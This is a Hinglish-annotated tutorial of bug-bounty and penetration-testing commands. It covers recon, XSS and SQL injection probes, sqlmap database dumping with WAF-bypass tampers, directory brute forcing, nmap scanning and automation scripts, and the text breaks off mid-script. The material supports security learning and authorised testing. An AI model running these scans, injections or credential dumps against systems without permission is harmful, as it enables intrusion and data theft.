# 🖥️ Command Usage Examples with Hinglish Context

## 📋 Table of Contents
1. [Basic Linux Commands](#basic-linux-commands)
2. [Reconnaissance Commands](#reconnaissance-commands)
3. [Vulnerability Testing Commands](#vulnerability-testing-commands)
4. [Automation Commands](#automation-commands)
5. [File Processing Commands](#file-processing-commands)
6. [Network Commands](#network-commands)

---

## 🐧 Basic Linux Commands (Buniyadi Linux Commands)

### File aur Directory Operations

```bash
# Directory banao (Create directory)
mkdir bug-hunting
# Hindi: "bug-hunting" naam ka folder banao

mkdir -p ~/tools/{recon,scanning,exploitation}
# Hindi: Multiple nested folders ek saath banao
# -p flag parent directories bhi bana deta hai

# Directory mein jao (Change directory)
cd bug-hunting
# Hindi: "bug-hunting" folder mein enter karo

cd ..
# Hindi: Ek level upar jao (parent directory)

cd ~
# Hindi: Home directory mein jao

# Files aur folders list karo (List files)
ls
# Hindi: Current directory ki files dikhao

ls -la
# Hindi: Detailed list with hidden files
# -l = long format, -a = all files (hidden bhi)

ls -lh
# Hindi: Human readable format mein file sizes
# -h = human readable (KB, MB, GB format mein)

# File content dekho (View file content)
cat subdomains.txt
# Hindi: File ka pura content screen pe print karo

head -10 large_file.txt
# Hindi: File ki pehli 10 lines dikhao

tail -20 log_file.txt
# Hindi: File ki last 20 lines dikhao

tail -f access.log
# Hindi: File ko continuously monitor karo (real-time updates)

# File search karo (Search files)
find . -name "*.txt"
# Hindi: Current directory mein saari .txt files dhundo

find /home -name "config*" -type f
# Hindi: /home directory mein "config" se shuru hone wali files dhundo

# Text search karo (Search text in files)
grep "password" config.txt
# Hindi: config.txt file mein "password" word dhundo

grep -r "api_key" .
# Hindi: Current directory aur subdirectories mein "api_key" dhundo
# -r = recursive (sabfolders mein bhi search karo)

grep -i "admin" users.txt
# Hindi: Case-insensitive search (ADMIN, admin, Admin sab match hoga)
# -i = ignore case
```

**Practical Example - Bug Hunting Context**:
```bash
# Bug hunting ke liye directory structure banao
mkdir -p ~/bug-bounty/{targets,recon,tools,reports,wordlists}

# Target company ke liye specific folder banao
mkdir -p ~/bug-bounty/targets/example.com/{subdomains,urls,vulnerabilities}

# Recon results check karo
ls -lh ~/bug-bounty/targets/example.com/subdomains/
# Output: total 156K
# -rw-r--r-- 1 user user  45K Jan 15 10:30 all_subdomains.txt
# -rw-r--r-- 1 user user  12K Jan 15 10:35 live_subdomains.txt

# Subdomains count karo
wc -l all_subdomains.txt
# Hindi: File mein kitni lines hain (kitne subdomains mile)
# Output: 1247 all_subdomains.txt
```

---

## 🔍 Reconnaissance Commands (Jasoosi ke Commands)

### Domain Information Gathering

```bash
# Whois information nikalo
whois example.com
# Hindi: Domain ki ownership aur registration details dekho

# DNS records check karo
dig example.com
# Hindi: Domain ke DNS records dekho (A, MX, NS, etc.)

dig example.com ANY
# Hindi: Saare DNS record types dekho

dig @8.8.8.8 example.com
# Hindi: Specific DNS server (Google) se query karo

nslookup example.com
# Hindi: DNS lookup karo (alternative to dig)

# Reverse DNS lookup
dig -x 192.168.1.1
# Hindi: IP address se domain name nikalo
```

**Practical Example**:
```bash
# Complete domain analysis
echo "[+] Starting domain analysis for example.com"

# Basic information
whois example.com | grep -E "(Registrar|Creation Date|Expiry Date)" > domain_info.txt
# Hindi: Important registration details save karo

# DNS enumeration
dig example.com ANY | tee dns_records.txt
# Hindi: DNS records file mein save karo
# tee command output ko file mein save bhi karta hai aur screen pe bhi dikhata hai

# Mail servers check karo
dig example.com MX | grep -v "^;" | grep MX
# Hindi: Mail server records nikalo
# grep -v "^;" comments ko filter out karta hai
```

### Subdomain Discovery

```bash
# Subfinder se subdomains dhundo
subfinder -d example.com -all -silent
# Hindi: Saare sources se subdomains dhundo, sirf results dikhao
# -all = all sources use karo
# -silent = verbose output nahi chahiye

subfinder -d example.com -all -silent -o subdomains.txt
# Hindi: Results ko file mein save karo
# -o = output file

# Assetfinder use karo
assetfinder --subs-only example.com
# Hindi: Sirf subdomains return karo, main domain nahi
# --subs-only = only subdomains

# Multiple tools combine karo
subfinder -d example.com -all -silent | anew all_subs.txt
assetfinder --subs-only example.com | anew all_subs.txt
# Hindi: anew tool duplicate entries remove kar deta hai

# Certificate Transparency se subdomains
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
# Hindi: SSL certificates se subdomains extract karo
# jq = JSON parser
# sed 's/\*\.//g' = wildcard (*.) remove karo
# sort -u = unique entries only
```

**Advanced Subdomain Discovery**:
```bash
# Comprehensive subdomain enumeration script
#!/bin/bash
domain="$1"
echo "[+] Starting comprehensive subdomain enumeration for $domain"

# Create output directory
mkdir -p recon/$domain

# Passive enumeration
echo "[+] Running passive enumeration..."
subfinder -d $domain -all -silent | anew recon/$domain/passive_subs.txt
assetfinder --subs-only $domain | anew recon/$domain/passive_subs.txt
amass enum -passive -d $domain | anew recon/$domain/passive_subs.txt

# Certificate transparency
echo "[+] Checking certificate transparency..."
curl -s "https://crt.sh/?q=%.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew recon/$domain/passive_subs.txt

# DNS bruteforce (optional - can be noisy)
echo "[+] Running DNS bruteforce..."
puredns bruteforce ~/wordlists/subdomains.txt $domain --resolvers ~/resolvers.txt | anew recon/$domain/bruteforce_subs.txt

# Combine all results
cat recon/$domain/*.txt | sort -u > recon/$domain/all_subdomains.txt

echo "[+] Total subdomains found: $(cat recon/$domain/all_subdomains.txt | wc -l)"
```

### Live Host Detection

```bash
# Httpx se live hosts check karo
cat subdomains.txt | httpx -silent
# Hindi: Sirf live websites dikhao

cat subdomains.txt | httpx -silent -status-code
# Hindi: HTTP status codes ke saath dikhao

cat subdomains.txt | httpx -silent -title -content-length
# Hindi: Page title aur content length bhi dikhao

# Specific status codes filter karo
cat subdomains.txt | httpx -silent -mc 200,301,302
# Hindi: Sirf 200, 301, 302 status codes wale show karo
# -mc = match codes

# Technology detection
cat subdomains.txt | httpx -silent -tech-detect
# Hindi: Websites pe kya technology use ho rahi hai

# Screenshots lo
cat live_hosts.txt | gowitness file -f -
# Hindi: Saari live websites ke screenshots lo
```

**Practical Live Host Analysis**:
```bash
# Complete live host analysis
echo "[+] Analyzing live hosts..."

# Basic alive check with details
cat all_subdomains.txt | httpx -silent -status-code -title -content-length -tech-detect | tee live_analysis.txt

# Filter interesting status codes
cat live_analysis.txt | grep -E "(200|301|302|403|500)" > interesting_hosts.txt

# Extract only URLs for further testing
cat live_analysis.txt | cut -d' ' -f1 > live_urls.txt

# Count by status codes
echo "Status Code Distribution:"
cat live_analysis.txt | awk '{print $2}' | sort | uniq -c | sort -nr
# Hindi: Har status code kitni baar aaya hai

# Find admin panels or interesting paths
cat live_urls.txt | while read url; do
    echo "[+] Testing $url"
    ffuf -u $url/FUZZ -w ~/wordlists/admin_panels.txt -mc 200,301,302 -fs 0 -t 50
done
```

---

## 🎯 Vulnerability Testing Commands

### XSS Testing

```bash
# Basic XSS payloads test karo
curl -X GET "https://target.com/search?q=<script>alert('XSS')</script>"
# Hindi: GET request mein XSS payload bhejo

curl -X POST -d "comment=<img src=x onerror=alert('XSS')>" https://target.com/submit
# Hindi: POST request mein XSS payload bhejo

# Multiple payloads test karo
payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing payload: $payload"
    curl -s "https://target.com/search?q=$payload" | grep -q "$payload" && echo "[!] Potential XSS found!"
done
# Hindi: Har payload test karo aur check karo ki response mein reflect ho raha hai
```

**Advanced XSS Testing**:
```bash
# Dalfox tool use karo (advanced XSS scanner)
dalfox url https://target.com/search?q=FUZZ
# Hindi: Automated XSS testing with advanced payloads

# File se URLs test karo
dalfox file urls.txt
# Hindi: Multiple URLs ek saath test karo

# Custom payloads ke saath
dalfox url https://target.com/search?q=FUZZ --custom-payload "alert('Custom')"
# Hindi: Apna custom payload use karo

# Blind XSS testing
dalfox url https://target.com/contact --blind https://your-xss-hunter.com
# Hindi: Blind XSS ke liye external server use karo
```

### SQL Injection Testing

```bash
# Manual SQL injection testing
curl "https://target.com/product?id=1'"
# Hindi: Single quote lagakar error generate karo

curl "https://target.com/product?id=1 OR 1=1--"
# Hindi: Boolean-based SQL injection test karo

curl "https://target.com/product?id=1 UNION SELECT 1,2,3--"
# Hindi: Union-based SQL injection test karo

# SQLMap use karo
sqlmap -u "https://target.com/product?id=1"
# Hindi: Automated SQL injection testing

sqlmap -u "https://target.com/product?id=1" --batch --level=5 --risk=3
# Hindi: Aggressive testing with high level and risk
# --batch = automatic answers
# --level = test level (1-5)
# --risk = risk level (1-3)

# POST request test karo
sqlmap -u "https://target.com/login" --data "username=admin&password=test"
# Hindi: POST parameters test karo

# Cookie-based injection
sqlmap -u "https://target.com/dashboard" --cookie "session=abc123" --level=2
# Hindi: Cookies mein SQL injection test karo
```

**SQLMap Advanced Usage**:
```bash
# Database enumeration
sqlmap -u "https://target.com/product?id=1" --dbs
# Hindi: Available databases list karo

sqlmap -u "https://target.com/product?id=1" -D database_name --tables
# Hindi: Specific database ke tables list karo

sqlmap -u "https://target.com/product?id=1" -D database_name -T users --columns
# Hindi: Table ke columns list karo

sqlmap -u "https://target.com/product?id=1" -D database_name -T users -C username,password --dump
# Hindi: Specific columns ka data dump karo

# WAF bypass techniques
sqlmap -u "https://target.com/product?id=1" --tamper=space2comment,charencode
# Hindi: WAF bypass ke liye tamper scripts use karo
```

### Directory and File Discovery

```bash
# Ffuf se directory fuzzing
ffuf -u https://target.com/FUZZ -w ~/wordlists/common.txt
# Hindi: Common directories dhundo

ffuf -u https://target.com/FUZZ -w ~/wordlists/common.txt -mc 200,301,302
# Hindi: Specific status codes filter karo

ffuf -u https://target.com/FUZZ -w ~/wordlists/common.txt -fs 1234
# Hindi: Specific file size filter karo (false positives remove karne ke liye)

# File extensions ke saath
ffuf -u https://target.com/FUZZ.php -w ~/wordlists/common.txt
# Hindi: PHP files specifically dhundo

# Multiple extensions test karo
ffuf -u https://target.com/FUZZ -w ~/wordlists/common.txt -e .php,.html,.js,.txt
# Hindi: Multiple file extensions try karo

# Gobuster use karo (alternative)
gobuster dir -u https://target.com -w ~/wordlists/common.txt
# Hindi: Directory brute forcing

gobuster dir -u https://target.com -w ~/wordlists/common.txt -x php,html,js
# Hindi: File extensions ke saath search karo
```

**Advanced Directory Discovery**:
```bash
# Comprehensive directory discovery script
#!/bin/bash
target="$1"
echo "[+] Starting directory discovery for $target"

# Common directories
echo "[+] Testing common directories..."
ffuf -u $target/FUZZ -w ~/wordlists/common.txt -mc 200,301,302,403 -o common_dirs.json

# Admin panels
echo "[+] Looking for admin panels..."
ffuf -u $target/FUZZ -w ~/wordlists/admin_panels.txt -mc 200,301,302 -o admin_panels.json

# Backup files
echo "[+] Looking for backup files..."
ffuf -u $target/FUZZ -w ~/wordlists/backup_files.txt -mc 200 -o backup_files.json

# API endpoints
echo "[+] Looking for API endpoints..."
ffuf -u $target/FUZZ -w ~/wordlists/api_endpoints.txt -mc 200,301,302 -o api_endpoints.json

# Technology-specific paths
echo "[+] Testing technology-specific paths..."
# WordPress
ffuf -u $target/FUZZ -w ~/wordlists/wordpress.txt -mc 200,301,302 -o wordpress.json

# Parse results
echo "[+] Parsing results..."
cat *.json | jq -r '.results[] | .url' | sort -u > all_discovered_paths.txt

echo "[+] Total paths discovered: $(cat all_discovered_paths.txt | wc -l)"
```

---

## 🤖 Automation Commands (Automation ke Commands)

### Bash Scripting for Bug Hunting

```bash
# Simple recon automation
#!/bin/bash
domain="$1"

if [ -z "$domain" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

echo "[+] Starting recon for $domain"

# Create directory structure
mkdir -p recon/$domain/{subdomains,urls,screenshots,vulnerabilities}

# Subdomain enumeration
echo "[+] Finding subdomains..."
subfinder -d $domain -all -silent | anew recon/$domain/subdomains/all.txt
assetfinder --subs-only $domain | anew recon/$domain/subdomains/all.txt

# Live host detection
echo "[+] Checking live hosts..."
cat recon/$domain/subdomains/all.txt | httpx -silent | anew recon/$domain/subdomains/live.txt

# URL discovery
echo "[+] Discovering URLs..."
cat recon/$domain/subdomains/live.txt | waybackurls | anew recon/$domain/urls/wayback.txt
cat recon/$domain/subdomains/live.txt | gau | anew recon/$domain/urls/gau.txt

# Screenshots
echo "[+] Taking screenshots..."
cat recon/$domain/subdomains/live.txt | gowitness file -f - -P recon/$domain/screenshots/

# Vulnerability scanning
echo "[+] Running vulnerability scans..."
nuclei -l recon/$domain/subdomains/live.txt -t ~/nuclei-templates/ -o recon/$domain/vulnerabilities/nuclei.txt

echo "[+] Recon completed for $domain"
echo "Results saved in recon/$domain/"
```

### Python Automation Scripts

```python
#!/usr/bin/env python3
"""
Bug Hunting Automation Script
"""
import requests
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
import json

class BugHunter:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = []
        self.live_hosts = []
        self.vulnerabilities = []
    
    def run_command(self, command):
        """Command execute karo aur output return karo"""
        try:
            result = subprocess.run(command.split(), capture_output=True, text=True)
            return result.stdout.strip().split('\n') if result.stdout else []
        except Exception as e:
            print(f"Error running command: {e}")
            return []
    
    def subdomain_enumeration(self):
        """Subdomain enumeration karo"""
        print(f"[+] Finding subdomains for {self.domain}")
        
        # Subfinder
        subfinder_cmd = f"subfinder -d {self.domain} -all -silent"
        subfinder_results = self.run_command(subfinder_cmd)
        
        # Assetfinder
        assetfinder_cmd = f"assetfinder --subs-only {self.domain}"
        assetfinder_results = self.run_command(assetfinder_cmd)
        
        # Combine results
        all_subs = list(set(subfinder_results + assetfinder_results))
        self.subdomains = [sub for sub in all_subs if sub and sub != '']
        
        print(f"[+] Found {len(self.subdomains)} subdomains")
        return self.subdomains
    
    def check_live_hosts(self):
        """Live hosts check karo"""
        print("[+] Checking live hosts...")
        
        def check_host(subdomain):
            try:
                # HTTPS try karo
                response = requests.get(f"https://{subdomain}", timeout=5, verify=False)
                if response.status_code:
                    self.live_hosts.append(f"https://{subdomain}")
                    return f"https://{subdomain}"
            except:
                try:
                    # HTTP try karo
                    response = requests.get(f"http://{subdomain}", timeout=5)
                    if response.status_code:
                        self.live_hosts.append(f"http://{subdomain}")
                        return f"http://{subdomain}"
                except:
                    pass
            return None
        
        # Parallel processing
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(check_host, self.subdomains))
        
        self.live_hosts = [host for host in results if host]
        print(f"[+] Found {len(self.live_hosts)} live hosts")
        return self.live_hosts
    
    def vulnerability_scan(self):
        """Basic vulnerability scanning"""
        print("[+] Running vulnerability scans...")
        
        def test_xss(url):
            """XSS testing"""
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ]
            
            for payload in payloads:
                try:
                    # GET parameter mein test karo
                    test_url = f"{url}?q={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        vuln = {
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XSS found: {test_url}")
                except:
                    pass
        
        # Parallel vulnerability testing
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(test_xss, self.live_hosts)
        
        print(f"[+] Found {len(self.vulnerabilities)} potential vulnerabilities")
        return self.vulnerabilities
    
    def generate_report(self):
        """Report generate karo"""
        report = {
            'domain': self.domain,
            'subdomains_found': len(self.subdomains),
            'live_hosts': len(self.live_hosts),
            'vulnerabilities': len(self.vulnerabilities),
            'details': {
                'subdomains': self.subdomains,
                'live_hosts': self.live_hosts,
                'vulnerabilities': self.vulnerabilities
            }
        }
        
        # JSON file mein save karo
        with open(f"{self.domain}_report.json", 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved: {self.domain}_report.json")
        return report

# Usage example
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 bug_hunter.py <domain>")
        sys.exit(1)
    
    domain = sys.argv[1]
    hunter = BugHunter(domain)
    
    # Complete workflow
    hunter.subdomain_enumeration()
    hunter.check_live_hosts()
    hunter.vulnerability_scan()
    hunter.generate_report()
    
    print(f"[+] Bug hunting completed for {domain}")
```

### One-liner Commands for Quick Testing

```bash
# Quick subdomain enumeration aur live check
echo "target.com" | subfinder -all -silent | httpx -silent | tee live_hosts.txt
# Hindi: Ek line mein subdomains dhundo aur live check karo

# URLs collect karo aur parameters extract karo
cat live_hosts.txt | waybackurls | grep "=" | cut -d'=' -f1 | sort -u | tee parameters.txt
# Hindi: Wayback machine se URLs nikalo aur parameters extract karo

# JavaScript files dhundo aur secrets search karo
cat live_hosts.txt | waybackurls | grep "\.js" | httpx -silent | xargs -I {} sh -c 'echo "Checking: {}" && curl -s {} | grep -E "(api_key|token|secret|password)" || true'
# Hindi: JS files mein sensitive information dhundo

# Admin panels dhundo
cat live_hosts.txt | while read url; do ffuf -u $url/FUZZ -w ~/wordlists/admin.txt -mc 200,301,302 -fs 0 -t 50 -s; done
# Hindi: Har live host pe admin panels dhundo

# Quick XSS testing
cat live_hosts.txt | while read url; do echo "[+] Testing $url" && curl -s "$url?q=<script>alert('XSS')</script>" | grep -q "<script>" && echo "[!] Potential XSS: $url"; done
# Hindi: Quick XSS test har URL pe

# Technology stack identify karo
cat live_hosts.txt | httpx -silent -tech-detect | grep -E "(WordPress|Drupal|Joomla|Laravel|Django)" | tee cms_sites.txt
# Hindi: Popular CMS/frameworks identify karo

# Certificate information nikalo
cat live_hosts.txt | while read url; do domain=$(echo $url | sed 's|https\?://||' | cut -d'/' -f1); echo "[+] $domain"; echo | openssl s_client -connect $domain:443 2>/dev/null | openssl x509 -noout -text | grep -E "(Subject|DNS)"; done
# Hindi: SSL certificate details check karo

# Quick port scan
cat subdomains.txt | while read sub; do echo "[+] Scanning $sub" && nmap -T4 -F $sub | grep -E "(open|filtered)"; done
# Hindi: Common ports quickly scan karo

# Response size analysis (find interesting pages)
cat live_hosts.txt | httpx -silent -content-length | sort -k2 -n | tail -10
# Hindi: Sabse bade response size wale pages dhundo

# Find login pages
cat live_hosts.txt | while read url; do ffuf -u $url/FUZZ -w ~/wordlists/login_pages.txt -mc 200 -fs 0 -s | grep -v "FUZZ"; done | tee login_pages.txt
# Hindi: Login pages dhundo saari sites pe
```

---

## 📁 File Processing Commands (File Processing ke Commands)

### Text Processing with Grep, Awk, Sed

```bash
# Grep advanced usage
grep -r -i "password\|secret\|key" source_code/
# Hindi: Source code mein sensitive keywords dhundo
# -r = recursive, -i = case insensitive

grep -E "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" file.txt
# Hindi: Email addresses extract karo using regex

grep -v "^#\|^$" config.file
# Hindi: Comments aur empty lines remove karo
# -v = invert match

# Awk for column processing
awk '{print $1}' access.log | sort | uniq -c | sort -nr
# Hindi: Access log se IP addresses count karo

awk -F',' '{print $2}' data.csv
# Hindi: CSV file ka second column print karo
# -F',' = comma separator

cat urls.txt | awk -F'/' '{print $3}' | sort -u
# Hindi: URLs se domain names extract karo

# Sed for text replacement
sed 's/http:/https:/g' urls.txt
# Hindi: HTTP ko HTTPS se replace karo
# s/old/new/g = substitute globally

sed -n '10,20p' large_file.txt
# Hindi: File ki line 10 se 20 tak print karo
# -n = suppress default output, p = print

sed '/^$/d' file.txt
# Hindi: Empty lines remove karo
# /^$/d = delete empty lines
```

**Practical File Processing Examples**:
```bash
# Log analysis for bug hunting
# Access log se suspicious requests dhundo
grep -E "(union|select|script|alert)" access.log | tee suspicious_requests.txt

# Error log se information disclosure dhundo
grep -i "error\|exception\|stack trace" error.log | head -50

# Configuration files mein sensitive info dhundo
find . -name "*.conf" -o -name "*.config" -o -name "*.ini" | xargs grep -i "password\|secret\|key"

# URLs se parameters extract karo
cat all_urls.txt | grep "?" | cut -d'?' -f2 | tr '&' '\n' | cut -d'=' -f1 | sort -u > parameters.txt

# Subdomains ko organize karo
cat all_subdomains.txt | awk -F'.' '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -nr
# Hindi: Root domains ke hisab se subdomains count karo

# Response codes analyze karo
cat httpx_results.txt | awk '{print $2}' | sort | uniq -c | sort -nr
# Hindi: HTTP status codes ka distribution dekho

# File sizes analyze karo
cat httpx_results.txt | awk '{print $3}' | sort -n | tail -10
# Hindi: Sabse bade response sizes dekho
```

### JSON and Data Processing

```bash
# jq for JSON processing
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value'
# Hindi: Certificate transparency se subdomains extract karo

cat api_response.json | jq '.data[] | .name'
# Hindi: JSON array se specific field extract karo

cat nuclei_results.json | jq '.[] | select(.severity=="high") | .url'
# Hindi: High severity vulnerabilities filter karo

# Multiple JSON files process karo
cat *.json | jq -s 'add | unique'
# Hindi: Multiple JSON files combine karo aur duplicates remove karo

# CSV processing
csvcut -c 1,3 data.csv
# Hindi: CSV file se column 1 aur 3 extract karo

csvgrep -c status -m "200" access_log.csv
# Hindi: Status code 200 wali entries filter karo

csvstat data.csv
# Hindi: CSV file ki statistics dekho
```

**Advanced Data Processing**:
```bash
# Comprehensive data analysis script
#!/bin/bash

echo "[+] Analyzing collected data..."

# Subdomain statistics
echo "=== Subdomain Analysis ==="
echo "Total subdomains: $(cat all_subdomains.txt | wc -l)"
echo "Live hosts: $(cat live_hosts.txt | wc -l)"
echo "Unique root domains: $(cat all_subdomains.txt | awk -F'.' '{print $(NF-1)"."$NF}' | sort -u | wc -l)"

# Technology analysis
echo "=== Technology Stack Analysis ==="
cat tech_detection.txt | awk '{print $2}' | sort | uniq -c | sort -nr | head -10

# Response code analysis
echo "=== HTTP Response Analysis ==="
cat httpx_results.txt | awk '{print $2}' | sort | uniq -c | sort -nr

# Parameter analysis
echo "=== Parameter Analysis ==="
echo "Unique parameters found: $(cat parameters.txt | wc -l)"
echo "Most common parameters:"
cat all_urls.txt | grep "=" | sed 's/.*?//g' | tr '&' '\n' | cut -d'=' -f1 | sort | uniq -c | sort -nr |  head -10

# Vulnerability summary
echo "=== Vulnerability Summary ==="
if [ -f nuclei_results.txt ]; then
    echo "Nuclei findings:"
    cat nuclei_results.txt | grep -o '\[.*\]' | sort | uniq -c | sort -nr
fi

# Generate final report
echo "=== Final Statistics ==="
echo "Scan completed at: $(date)"
echo "Total files processed: $(ls -1 *.txt *.json 2>/dev/null | wc -l)"
echo "Total data size: $(du -sh . | cut -f1)"
```

---

## 🌐 Network Commands (Network ke Commands)

### Network Reconnaissance

```bash
# Nmap basic scanning
nmap target.com
# Hindi: Basic port scan karo

nmap -sV target.com
# Hindi: Service version detection
# -sV = version detection

nmap -sC target.com
# Hindi: Default scripts run karo
# -sC = default scripts

nmap -A target.com
# Hindi: Aggressive scan (OS detection, version, scripts)
# -A = aggressive

nmap -p- target.com
# Hindi: Saare ports scan karo (1-65535)
# -p- = all ports

nmap -p 80,443,8080,8443 target.com
# Hindi: Specific ports scan karo

# Fast scanning
nmap -T4 -F target.com
# Hindi: Fast scan with common ports
# -T4 = timing template (faster)
# -F = fast scan (top 100 ports)

# Stealth scanning
nmap -sS target.com
# Hindi: SYN stealth scan
# -sS = SYN scan

# UDP scanning
nmap -sU target.com
# Hindi: UDP ports scan karo
# -sU = UDP scan
```

**Advanced Network Scanning**:
```bash
# Comprehensive network reconnaissance
#!/bin/bash
target="$1"

echo "[+] Starting network reconnaissance for $target"

# Basic host discovery
echo "[+] Host discovery..."
nmap -sn $target/24 | grep "Nmap scan report" | awk '{print $5}' > live_hosts.txt

# Port scanning
echo "[+] Port scanning..."
nmap -T4 -F $target | tee nmap_basic.txt

# Service detection
echo "[+] Service detection..."
nmap -sV -sC $target | tee nmap_detailed.txt

# Vulnerability scanning
echo "[+] Vulnerability scanning..."
nmap --script vuln $target | tee nmap_vulns.txt

# Web service enumeration
echo "[+] Web service enumeration..."
nmap -p 80,443,8080,8443 --script http-enum $target | tee web_enum.txt

echo "[+] Network reconnaissance completed"
```

### SSL/TLS Analysis

```bash
# SSL certificate information
openssl s_client -connect target.com:443 -servername target.com
# Hindi: SSL connection establish karo aur certificate dekho

# Certificate details extract karo
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text
# Hindi: Certificate ki detailed information

# Certificate expiry check karo
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates
# Hindi: Certificate ki validity dates

# SSL/TLS version testing
nmap --script ssl-enum-ciphers -p 443 target.com
# Hindi: Supported SSL/TLS versions aur ciphers check karo

# SSL vulnerabilities check karo
nmap --script ssl-* -p 443 target.com
# Hindi: SSL related vulnerabilities scan karo
```

### DNS Analysis

```bash
# DNS zone transfer attempt
dig @ns1.target.com target.com AXFR
# Hindi: Zone transfer try karo (usually fails)

# DNS brute forcing
dnsrecon -d target.com -t brt
# Hindi: DNS brute force attack

# Reverse DNS lookup
dnsrecon -r 192.168.1.0/24
# Hindi: IP range ka reverse DNS lookup

# DNS cache snooping
dnsrecon -d target.com -t snoop
# Hindi: DNS cache snooping attack

# Find mail servers
dig target.com MX
# Hindi: Mail server records

# Find name servers
dig target.com NS
# Hindi: Name server records
```

**Complete Network Analysis Script**:
```bash
#!/bin/bash
target="$1"

if [ -z "$target" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

echo "[+] Complete network analysis for $target"
mkdir -p network_analysis/$target

# DNS enumeration
echo "[+] DNS enumeration..."
dig $target ANY > network_analysis/$target/dns_records.txt
dnsrecon -d $target -t std > network_analysis/$target/dnsrecon.txt

# Port scanning
echo "[+] Port scanning..."
nmap -T4 -A $target > network_analysis/$target/nmap_aggressive.txt
nmap -sU -T4 --top-ports 1000 $target > network_analysis/$target/nmap_udp.txt

# SSL/TLS analysis
echo "[+] SSL/TLS analysis..."
nmap --script ssl-* -p 443 $target > network_analysis/$target/ssl_analysis.txt

# Web application analysis
echo "[+] Web application analysis..."
nmap -p 80,443 --script http-* $target > network_analysis/$target/web_analysis.txt

# Vulnerability scanning
echo "[+] Vulnerability scanning..."
nmap --script vuln $target > network_analysis/$target/vulnerabilities.txt

echo "[+] Network analysis completed. Results in network_analysis/$target/"
```

---

## 🎯 Practical Usage Examples (Vyavaharik Upyog ke Udaharan)

### Complete Bug Hunting Workflow

```bash
#!/bin/bash
# Complete bug hunting automation script

target="$1"
if [ -z "$target" ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

echo "🎯 Starting complete bug hunting workflow for $target"
echo "📅 Started at: $(date)"

# Create directory structure
mkdir -p bug_hunt_$target/{recon,scanning,exploitation,reports}
cd bug_hunt_$target

# Phase 1: Information Gathering
echo "🔍 Phase 1: Information Gathering"
whois $target > recon/whois.txt
dig $target ANY > recon/dns.txt
nmap -T4 -F $target > recon/nmap.txt

# Phase 2: Subdomain Discovery
echo "🌐 Phase 2: Subdomain Discovery"
subfinder -d $target -all -silent | anew recon/subdomains.txt
assetfinder --subs-only $target | anew recon/subdomains.txt
amass enum -passive -d $target | anew recon/subdomains.txt

echo "   Found $(cat recon/subdomains.txt | wc -l) subdomains"

# Phase 3: Live Host Detection
echo "✅ Phase 3: Live Host Detection"
cat recon/subdomains.txt | httpx -silent -status-code -title | tee recon/live_hosts.txt

echo "   Found $(cat recon/live_hosts.txt | wc -l) live hosts"

# Phase 4: Technology Detection
echo "🔧 Phase 4: Technology Detection"
cat recon/live_hosts.txt | cut -d' ' -f1 | httpx -silent -tech-detect > recon/technology.txt

# Phase 5: URL Discovery
echo "🔗 Phase 5: URL Discovery"
cat recon/live_hosts.txt | cut -d' ' -f1 | waybackurls | anew recon/urls.txt
cat recon/live_hosts.txt | cut -d' ' -f1 | gau | anew recon/urls.txt

echo "   Found $(cat recon/urls.txt | wc -l) URLs"

# Phase 6: Parameter Discovery
echo "📋 Phase 6: Parameter Discovery"
cat recon/urls.txt | grep "=" | cut -d'=' -f1 | rev | cut -d'?' -f1 | rev | sort -u > recon/parameters.txt

echo "   Found $(cat recon/parameters.txt | wc -l) unique parameters"

# Phase 7: Directory Discovery
echo "📁 Phase 7: Directory Discovery"
cat recon/live_hosts.txt | cut -d' ' -f1 | head -10 | while read url; do
    echo "   Scanning $url"
    ffuf -u $url/FUZZ -w ~/wordlists/common.txt -mc 200,301,302,403 -fs 0 -t 50 -s >> scanning/directories.txt
done

# Phase 8: Vulnerability Scanning
echo "🚨 Phase 8: Vulnerability Scanning"
cat recon/live_hosts.txt | cut -d' ' -f1 | nuclei -t ~/nuclei-templates/ -o scanning/nuclei.txt

# Phase 9: Manual Testing Preparation
echo "🎯 Phase 9: Manual Testing Preparation"
# XSS testing URLs
cat recon/urls.txt | grep "=" | head -50 > exploitation/xss_targets.txt

# SQL injection testing URLs
cat recon/urls.txt | grep -E "(id=|user=|page=)" | head -50 > exploitation/sqli_targets.txt

# IDOR testing URLs
cat recon/urls.txt | grep -E "(\d+)" | head -50 > exploitation/idor_targets.txt

# Phase 10: Report Generation
echo "📊 Phase 10: Report Generation"
cat > reports/summary.txt << EOF
Bug Hunting Report for $target
Generated on: $(date)

=== RECONNAISSANCE SUMMARY ===
Subdomains found: $(cat recon/subdomains.txt | wc -l)
Live hosts: $(cat recon/live_hosts.txt | wc -l)
URLs discovered: $(cat recon/urls.txt | wc -l)
Parameters found: $(cat recon/parameters.txt | wc -l)

=== TECHNOLOGY STACK ===
$(cat recon/technology.txt | head -10)

=== NUCLEI FINDINGS ===
$(cat scanning/nuclei.txt | wc -l) potential issues found
$(cat scanning/nuclei.txt | grep -o '\[.*\]' | sort | uniq -c | sort -nr | head -5)

=== MANUAL TESTING TARGETS ===
